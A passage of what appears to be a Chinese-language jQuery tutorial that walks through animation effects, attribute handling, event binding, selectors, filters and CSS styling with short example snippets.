<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[name=fadein_btn]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;img&quot;</span>).fadeIn(<span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;input[name=fadeout_btn]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;img&quot;</span>).fadeOut(<span class="number">2000</span>);</span><br><span class="line">&#125;);	</span><br><span class="line">$(<span class="string">&quot;input[name=fadeinout_btn]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;img&quot;</span>).fadeToggle(<span class="number">2000</span>);</span><br><span class="line">&#125;);	</span><br><span class="line">$(<span class="string">&quot;input[name=fadeto_btn]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;img&quot;</span>).fadeTo(<span class="number">2000</span>,<span class="number">0.3</span>); </span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>

<h4 id="2、上拉下拉"><a href="#2、上拉下拉" class="headerlink" title="2、上拉下拉"></a>2、上拉下拉</h4><blockquote>
<p>slideDown() slideUp()</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;txt&quot; style=&quot;display:none&quot;&gt;	</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn_down&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$(<span class="string">&quot;.txt&quot;</span>).slideDown(<span class="number">5000</span>);  <span class="comment">//下拉5秒</span></span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#btn_up&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$(<span class="string">&quot;.txt&quot;</span>).slideUp(<span class="number">5000</span>);  <span class="comment">//上拉5秒</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="3、显示和隐藏"><a href="#3、显示和隐藏" class="headerlink" title="3、显示和隐藏"></a>3、显示和隐藏</h4><blockquote>
<p>show()  hide()</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#pic&quot;</span>).show(<span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#pic&quot;</span>).hide(<span class="number">2000</span>);</span><br><span class="line">&#125;);	</span><br><span class="line">$(<span class="string">&quot;#btn3&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#pic&quot;</span>).toggle(<span class="number">2000</span>); <span class="comment">//显示与隐藏中切换</span></span><br><span class="line">&#125;);							</span><br></pre></td></tr></table></figure>

<h2 id="二、属性操作"><a href="#二、属性操作" class="headerlink" title="二、属性操作"></a>二、属性操作</h2><p><strong>attr、prop</strong></p>
<h4 id="1、attr"><a href="#1、attr" class="headerlink" title="1、attr"></a>1、attr</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//attribute读</span></span><br><span class="line">        <span class="keyword">var</span> title=$(<span class="string">&quot;li:first&quot;</span>).attr(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">        alert(title);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		$(<span class="string">&quot;li:first&quot;</span>).attr(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#btn4&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> alt=$(<span class="string">&quot;img&quot;</span>).attr(<span class="string">&quot;alt&quot;</span>);</span><br><span class="line">		alert(alt);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#btn5&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		$(<span class="string">&quot;img&quot;</span>).attr(&#123;</span><br><span class="line">			width:<span class="string">&quot;75&quot;</span>,	<span class="comment">//写多个属性</span></span><br><span class="line">			height:<span class="string">&quot;100&quot;</span></span><br><span class="line">		&#125;);		</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="removeAttr"><a href="#removeAttr" class="headerlink" title="removeAttr"></a>removeAttr</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn3&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//移除属性</span></span><br><span class="line">    $(<span class="string">&quot;li:first&quot;</span>).removeAttr(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="2、prop"><a href="#2、prop" class="headerlink" title="2、prop"></a>2、prop</h4><p><strong>适用于enable disenable selected checked</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn6&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#ckx&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="string">&quot;true&quot;</span>); <span class="comment">//enabled disabled selected checked</span></span><br><span class="line">&#125;);</span><br><span class="line">				</span><br><span class="line">$(<span class="string">&quot;#btn7&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">// $(&quot;#ckx&quot;).prop(&quot;checked&quot;,&quot;false&quot;);//不可行</span></span><br><span class="line">      $(<span class="string">&quot;#ckx&quot;</span>).removeAttr(<span class="string">&quot;checked&quot;</span>) <span class="comment">//可行</span></span><br><span class="line">     <span class="comment">// $(&quot;#ckx&quot;)[0].checked=false;	//可行</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="三、事件"><a href="#三、事件" class="headerlink" title="三、事件"></a>三、事件</h2><h4 id="1、change事件"><a href="#1、change事件" class="headerlink" title="1、change事件"></a>1、change事件</h4><p><strong>change</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册改变事件</span></span><br><span class="line">$(<span class="string">&quot;.info&quot;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// alert(&quot;性别为:&quot;+$(&quot;.info&gt;option:selected&quot;).val());</span></span><br><span class="line">    $(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;#7FE&quot;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="2、键盘事件"><a href="#2、键盘事件" class="headerlink" title="2、键盘事件"></a>2、键盘事件</h4><p><strong>keydown、keypress、keyup</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#password&quot;</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#events&quot;</span>).append(<span class="string">&quot;keyup&quot;</span>);</span><br><span class="line">&#125;).keydown(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#events&quot;</span>).append(<span class="string">&quot;keydown&quot;</span>);</span><br><span class="line">&#125;).keypress(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#events&quot;</span>).append(<span class="string">&quot;keypress&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#userName&quot;</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.keyCode==<span class="number">13</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#password&quot;</span>).focus();</span><br><span class="line">        e.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#password&quot;</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.keyCode==<span class="number">13</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#form1&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> confirm(<span class="string">&quot;你确认提交吗&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="3、焦点事件"><a href="#3、焦点事件" class="headerlink" title="3、焦点事件"></a>3、焦点事件</h4><p><strong>focus</strong>、<strong>blus失去焦点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得焦点</span></span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> $(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">&#125;); </span><br><span class="line"><span class="comment">// 失去焦点</span></span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> $(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;white&quot;</span>);</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure>

<h4 id="4、事件绑定事件"><a href="#4、事件绑定事件" class="headerlink" title="4、事件绑定事件"></a>4、事件绑定事件</h4><p><strong>on绑定、off解绑</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//通过on()方式为div中添加一个元素</span></span><br><span class="line">    $(<span class="string">&quot;#btn&quot;</span>).on(<span class="string">&quot;click&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;&lt;p&gt;这是第一个&lt;/p&gt;&#x27;</span>).appendTo($(<span class="string">&#x27;#dv&#x27;</span>));</span><br><span class="line">        $(<span class="string">&#x27;&lt;p&gt;这是第二个&lt;/p&gt;&#x27;</span>).appendTo($(<span class="string">&#x27;#dv&#x27;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);	</span><br><span class="line">$(<span class="string">&quot;#btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#btn&quot;</span>).off(<span class="string">&quot;click&quot;</span>);                                                         </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="5、鼠标事件"><a href="#5、鼠标事件" class="headerlink" title="5、鼠标事件"></a>5、鼠标事件</h4><p><strong>mouseover鼠标移入、mouseout鼠标移出</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;h3 style=<span class="string">&quot;background-color:white;&quot;</span>&gt;</span><br><span class="line">    mouseover事件被触发&lt;span id=<span class="string">&quot;mover&quot;</span>&gt;<span class="number">0</span>&lt;<span class="regexp">/span&gt;次&lt;/</span>br&gt;</span><br><span class="line">	mouseout事件被触发&lt;span id=<span class="string">&quot;mout&quot;</span>&gt;<span class="number">0</span>&lt;/span&gt;次</span><br><span class="line">&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.dv&quot;</span>).mouseover(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">    $(<span class="string">&#x27;#mover&#x27;</span>).text(y+=<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;.dv&quot;</span>).mouseout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">    $(<span class="string">&#x27;#mout&#x27;</span>).text(x+=<span class="number">1</span>);</span><br><span class="line">&#125;);				</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.dv&quot;</span>).hover(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;	<span class="comment">//光标移入</span></span><br><span class="line">	$(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;	<span class="comment">//光标移出</span></span><br><span class="line">	$(<span class="built_in">this</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="四、选择器"><a href="#四、选择器" class="headerlink" title="四、选择器"></a>四、选择器</h2><h3 id="1、基本选择器"><a href="#1、基本选择器" class="headerlink" title="1、基本选择器"></a>1、基本选择器</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#byId&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);	<span class="comment">//id选择器</span></span><br><span class="line">$(<span class="string">&quot;.byClass&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);	<span class="comment">//类选择器</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);	<span class="comment">//标签选择器</span></span><br><span class="line">$(<span class="string">&quot;*&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);  <span class="comment">//通配符选择器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//只选择有类为byClass或者id为byId的标签对象</span></span><br><span class="line">$(<span class="string">&quot;#byId,.byClass&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2、层级选择器"><a href="#2、层级选择器" class="headerlink" title="2、层级选择器"></a>2、层级选择器</h3><p><strong>“&gt;直接后代==children()”</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#dv&gt;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);<span class="comment">//选择div下的儿子p标签</span></span><br><span class="line"><span class="comment">//children方法</span></span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).children(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>全部后代  “空格”、find()</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找后代的全部p标签</span></span><br><span class="line">$(<span class="string">&quot;#dv p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//find方法</span></span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).find(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>后面的第一个   +</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#dv+p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>); <span class="comment">//dv的第一个p元素</span></span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).next(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>后面的所有    ~</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#dv~p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>); <span class="comment">//dv后的所有p元素</span></span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).nextAll()(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>前面元素prev</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#dv&quot;</span>).prev(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).prev(<span class="string">&quot;p&quot;</span>).prev(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>); <span class="comment">//连缀</span></span><br><span class="line">$(<span class="string">&quot;#dv&quot;</span>).prevAll(<span class="string">&quot;p&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>siblings==== nextAll+prevAll</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#dv&quot;</span>).siblings(<span class="string">&#x27;p&#x27;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>父级选择</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#p1&quot;</span>).parent().prev().css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#p1&quot;</span>).parent().parent().parent().next().next().css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、属性选择器"><a href="#3、属性选择器" class="headerlink" title="3、属性选择器"></a>3、属性选择器</h3><p><strong>可选择包含有 id属性等等</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变含有title属性=cartoonlist的元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;[title=cartoonlist]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变含有title属性的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li[title]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变title属性的值中以h开头的元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;[title^=h]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变title属性的值中以jp结尾的元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;[title$=jp]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变title属性的值中含有s的元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;[title*=s]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变包含events属性，且title属性的值中含有y的&lt;li&gt;元素的背景颜色 </span></span><br><span class="line">$(<span class="string">&quot;li[title*=y][class=evens]&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="4、过滤"><a href="#4、过滤" class="headerlink" title="4、过滤"></a>4、过滤</h3><h4 id="a、基本过滤"><a href="#a、基本过滤" class="headerlink" title="a、基本过滤"></a>a、基本过滤</h4><p><strong>first</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变第1个&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:first&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;li&quot;</span>).first().css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>last</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变最后一个&lt;li&gt;元素的背景颜色</span></span><br><span class="line"> $(<span class="string">&quot;li:last&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"> $(<span class="string">&quot;li&quot;</span>).last().css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>not</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变class不为three的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:not(.three)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>odd</strong>、<strong>even</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变索引值为偶数的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:even&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变索引值为奇数的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:odd&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>eq相等、gt大于、lt小于</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变索引值等于1的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:eq(1)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变索引值大于1的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:gt(1)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//改变索引值小于1的&lt;li&gt;元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;li:lt(1)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>header</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//改变所有标题元素，例如&lt;h1&gt;,&lt;h2&gt;,&lt;h3&gt;……这些元素的背景颜色</span></span><br><span class="line">$(<span class="string">&quot;:header&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="b、可见性过滤"><a href="#b、可见性过滤" class="headerlink" title="b、可见性过滤"></a>b、可见性过滤</h4><p>CSS: <strong>display:none</strong>  不可见   <strong>display:block</strong>  可见</p>
<p><strong>:visible show()</strong></p>
<p><strong>:hidden  hide()</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[name=show]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// $(&quot;p:hidden&quot;).css(&quot;display&quot;,&quot;block&quot;);</span></span><br><span class="line">    $(<span class="string">&quot;p:hidden&quot;</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[name=hide]&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// $(&quot;p:visible&quot;).css(&quot;display&quot;,&quot;none&quot;);</span></span><br><span class="line">    $(<span class="string">&quot;p:visible&quot;</span>).hide();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="c、内容过滤"><a href="#c、内容过滤" class="headerlink" title="c、内容过滤"></a>c、内容过滤</h4><p><strong>:contains</strong>    文本内容</p>
<p><strong>:has</strong>          标签</p>
<p><strong>:empty</strong>      空</p>
<p><strong>:parent</strong>      是否为父标签</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;div:contains(&#x27;也&#x27;)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;div:has(span)&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;div:empty&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//:parent判断当前元素是否是父元素</span></span><br><span class="line">$(<span class="string">&quot;div:parent&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="d、表单过滤"><a href="#d、表单过滤" class="headerlink" title="d、表单过滤"></a>d、表单过滤</h4><p><strong>:enable</strong> 可用</p>
<p><strong>:disable</strong> 不可用</p>
<p><strong>:checked</strong> 选中 单选框radio 复选框checkbox</p>
<p><strong>:selected</strong> 选择 下拉列表select option</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;:input&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;orange&quot;</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;:text&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;orange&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;:password&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;orange&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;:radio&quot;</span>).hide();</span><br><span class="line">$(<span class="string">&quot;:checkbox&quot;</span>).hide();</span><br><span class="line">$(<span class="string">&quot;:button&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;orange&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;:image&quot;</span>).hide();</span><br><span class="line">$(<span class="string">&quot;:reset&quot;</span>).hide();</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input:checked&quot;</span>).hide();</span><br><span class="line">alert($(<span class="string">&quot;option:selected&quot;</span>).val());</span><br></pre></td></tr></table></figure>

<h2 id="五、样式css"><a href="#五、样式css" class="headerlink" title="五、样式css"></a>五、样式css</h2><h3 id="1、样式"><a href="#1、样式" class="headerlink" title="1、样式"></a>1、样式</h3><h4 id="（1）设置样式"><a href="#（1）设置样式" class="headerlink" title="（1）设置样式"></a>（1）设置样式</h4><p>设置多个属性使用<strong>大括号</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;div&quot;</span>).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;pink&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).css(<span class="string">&quot;width&quot;</span>,<span class="string">&quot;150px&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).css(<span class="string">&quot;height&quot;</span>,<span class="string">&quot;150px&quot;</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).css(&#123;<span class="attr">backgroundColor</span>:<span class="string">&quot;pink&quot;</span>,<span class="attr">width</span>:<span class="string">&quot;150px&quot;</span>,<span class="string">&quot;height&quot;</span>:<span class="string">&quot;150px&quot;</span>,</span><br><span class="line"><span class="string">&quot;border-radius&quot;</span>:<span class="string">&quot;5%&quot;</span>&#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="（2）获取样式"><a href="#（2）获取样式" class="headerlink" title="（2）获取样式"></a>（2）获取样式</h4><p>获取多个样式使用<strong>中括号</strong></p>
